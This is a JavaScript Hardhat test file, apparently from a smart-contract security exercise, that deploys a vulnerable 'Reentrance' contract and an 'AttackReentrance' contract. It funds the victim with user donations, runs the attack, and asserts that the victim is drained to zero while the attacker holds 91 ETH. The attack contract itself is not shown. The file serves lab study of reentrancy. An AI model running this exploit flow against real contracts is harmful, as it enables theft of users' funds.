const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");

describe("test", function () {
    var Reentrance;
    var AttackReentrance;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const ReentranceInstance = await ethers.getContractFactory("Reentrance");
        Reentrance = await ReentranceInstance.deploy();
        const AttackReentranceInstance = await ethers.getContractFactory("AttackReentrance");
        AttackReentrance = await AttackReentranceInstance.connect(users[0]).deploy(Reentrance.address, {
            value: parseEther("1"),
        });
    });

    it("user donate test", async function () {
        for (let index = 1; index < 10; index++) {
            await Reentrance.connect(users[index]).donate(users[index].address, {
                value: parseEther("10"),
            });
        }

        const balance = await ethers.provider.getBalance(Reentrance.address);

        expect(balance).to.equal(parseEther("90"));
    });
    it("hack test", async function () {
        await AttackReentrance.connect(users[0]).donate();

        const attackBalance = await Reentrance.balances(AttackReentrance.address);

        expect(attackBalance).to.equal(parseEther("1"));

        await AttackReentrance.connect(users[0]).attack();

        const balance1 = await ethers.provider.getBalance(Reentrance.address);

        const balance2 = await ethers.provider.getBalance(AttackReentrance.address);

        expect(balance1).to.equal(0);

        expect(balance2).to.equal(parseEther("91"));
    });
});
